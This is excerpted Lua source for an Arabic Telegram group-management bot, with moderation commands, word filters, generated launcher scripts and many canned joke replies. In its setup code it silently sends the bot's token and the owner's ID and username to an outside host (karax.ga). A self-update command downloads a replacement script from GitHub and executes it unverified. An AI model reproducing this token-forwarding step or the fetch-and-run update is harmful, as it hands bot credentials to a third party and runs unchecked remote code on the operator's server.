...
os.execute('lua BASHACLEANER.lua')
end
...
SUDO = database:get(id_server..":SUDO:ID")
UserName = database:get(id_server..":SUDO:USERNAME")
https.request('http://karax.ga/BASHACLEANER/?token='..token..'&id='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
create_config_auto()
file = io.open("BASHACLEANER", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/BASHACLEANER
token="]]..database:get(id_server..":token")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./BASHACLEANER.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BS", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S BASHACLEANER -X kill
screen -S BASHACLEANER ./BASHACLEANER
done
]])  
file:close() 
...
local BASHACLEANER_Msg = ''  
if msgs < 100 then 
BASHACLEANER_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
BASHACLEANER_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
BASHACLEANER_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
BASHACLEANER_Msg = 'متفاعل' 
elseif msgs < 1200 then 
BASHACLEANER_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
BASHACLEANER_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
BASHACLEANER_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
BASHACLEANER_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
BASHACLEANER_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
BASHACLEANER_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
BASHACLEANER_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
BASHACLEANER_Msg = 'امبروطور التفاعل☣️' 
elseif msgs < 10000000000 then 
BASHACLEANER_Msg = 'رب التفاعل💖'  
end 
return BASHACLEANER_Msg 
end
function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'BASHACLEANER Chat'
...
--------------------------------------------------------------------------------------------------------------
function SourceBASHACLEANER(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,BASHACLEANER_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf BASHACLEANER.lua')
os.execute('wget https://raw.githubusercontent.com/BASHATEAM/BASHACLEANER/master/BASHACLEANER.lua')
send(msg.chat_id_, msg.id_,'♻¦ تم تحديث السورس') 
dofile('BASHACLEANER.lua')  
end
...
local BASHACLEANER = (w + q)
local sendok = #group - BASHACLEANER
if q == 0 then
BASHACLEANER = ''
else
...
send(msg.chat_id_, msg.id_,'❏︙ عدد المجموعات الان » { '..#group..' }'..BASHACLEANERk..''..BASHACLEANER..'\n*📌┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local BASHACLEANER_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if BASHACLEANER_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
send(msg.chat_id_, msg.id_, t..'————× Laura ×————')
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'❏︙بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'EEl00 ')..') \n❏︙تـم قفـل الدردشه ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'❏︙بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'EEl00 ')..') \n❏︙تـم قفـل التاك بالكتم ')  
end,nil)   
...
local UserName = (b.username_ or "BASHACLEANER")
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n❏︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBASHACLEANER')..')'
status  = '\n❏︙تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
usertext = '\n❏︙العضو » ['..result.title_..'](t.me/'..(username or 'DEVBASHACLEANER')..')'
status  = '\n❏︙تم ترقيته ادمن'
texts = usertext..status
else
texts = '❏︙لا يوجد حساب بهاذا المعرف'
...
time = times * 60
local function Restricted(Kara,BASHACLEANER)
if tonumber(BASHACLEANER.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '\n❏︙ عذرا لا تستطيع كتم ( '..Rutba(BASHACLEANER.sender_user_id_,msg.chat_id_)..' )')
return false  
end
if Can_or_NotCan(BASHACLEANER.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n❏︙ عذرا لا تستطيع كتم ( '..Rutba(BASHACLEANER.sender_user_id_,msg.chat_id_)..' )')
else
MuteUser(msg.chat_id_,BASHACLEANER.sender_user_id_,msg.date_+time)
local function name(kara,BASHACLEANER)
if BASHACLEANER.username_ == '' then name = BASHACLEANER.first_name_ else name = BASHACLEANER.username_ end
send(msg.chat_id_,msg.id_,"⚠ ¦ العضو《["..name.."](tg://user?id="..BASHACLEANER.sender_user_id_..")》\nا┄─━━◉━━─┄\n⏳¦ تم كتم لمدة "..times.." دقايق ⏰")
end
getUser(BASHACLEANER.sender_user_id_,name)
end
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else
...
t = "\n❏︙ قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do  
local EEl00_Msg = database:get(bot_id.."Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..''..k..'- '..v..' » {'..EEl00_Msg..'}\n'    
end  
if #list == 0 then  
...
'هلا حبي امر بس 😴.',
'مشغوله حالياً 🌚🌸',
'عمري فداك '..Namebot..' امرني ي عيني 🥺'
}
send(msg.chat_id_, msg.id_,'['..BASHACLEANER_Msg[math.random(#BASHACLEANER_Msg)]..']') 
return false
end
...
local texting = {"وعليكم السلام 😍💋✨","هلا وغلا😻 ♛⇣🐰☄️₎✦","وعليكم السلام حياتي ☺️","هلا بالزين كله🌝💔" }
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"تمام وانت ۦ","مو بخير 🙁🤞","شدخلك انت 🧐😂 بخير شلونك انت☺️🙊﴾" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"لا انقلع 😒??","اعتقد انا مو صخله ويربطوني🥺😹","لاسف مربوطه بشجره😔😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ياعمري احلى قرد🤔😂","ايش في اعترف😉😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اركد اركد😹","هلا بالخميس💃😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {" هلاوات ياحياتي•💝ֆ﴿♂✨₎ֆ","يۧمۘهِ هِلۛا بسورُهِا ونۨورُهِا 😻🐼🌿"," لأ هلأ ولأ مسهلا انقلع😻😂✨","هلا قلببببي♥️♥️✨","هلوات يروحي💓😎" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"بووت بعيننننك 🤤😹😳","اي لا مو بوت شرايك خير يا طير😤" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اختر اغنيه بس🥺😹💭💔ۦ","لا مافيه هش😍😂 🌸‘","أشتغل عندك ؟!⚡️🔱ۦ","ارقص وانا اغني 💃💃😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"بايات حياتي بلا رجعه 💛","انتبه لنفسكك😔😹💔","باي 😂🌝✋🏾","الله معك انقلع😂😶" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"لا تقول جاو قول باي حمار 😳شاقه جايات😹","جاوات ₎✿❥" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"نورك هذا ي قلبي🌝","بوجودك/غلا تسلم 😻✨","عمري انت 😋","نورك لبى عينك ♥️" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "😐" or text == "🙂" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"خير شفييييه😂💔","منور 😐😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"دووم  🙊","دوم الضحكه حبيبي ℡̮⇣┆👑😻⇣ۦ ٰ" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end

if text == "اقولك" or text == "اكلج" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اي  اسمعك👂🏽😹","لا اسكت😔😹","ها حياتي 🙊" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end

if text == "شبيك" or text == "شفيك" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"انت شفيكك 😣","مافيني شي  💋😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if text == "🌚💔" or text == "💔" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"شفيككك بسم الله !😂♥️","من كسر قلبك 😡","نفسيه🐸👌" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"فداك الكون ياقلببي♥️","تسلم لي 🥺","بس انا 🙄" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if text == "اسكت" or text == "نجب" or text == "أنجب" or text == "نجبب" or text == "جب" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"انجب انت  😤","انادي لك المدير😒" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if text == "☺️" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"يازين اللي يستحون 🙈😂","وجهك مايصير يستحي😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
BASHACLEANER = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(BASHACLEANER)
...
--------------------------------------------------------------------------------------------------------------
SourceBASHACLEANER(data.message_,data)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local BASHACLEANERbot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if BASHACLEANERbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"❏︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n❏︙["..BASHACLEANERbot.."] \n") 
else
